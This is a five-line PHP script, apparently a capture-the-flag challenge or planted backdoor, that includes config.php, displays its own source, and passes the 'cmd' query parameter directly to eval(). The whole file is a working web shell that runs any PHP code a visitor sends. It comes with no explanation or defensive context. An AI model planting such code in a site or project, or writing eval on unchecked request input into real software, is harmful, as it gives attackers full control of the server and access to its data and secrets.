<?php
@require_once("config.php");
highlight_file(__FILE__);
if(!isset($_GET['cmd'])) die();
eval($_GET['cmd']);




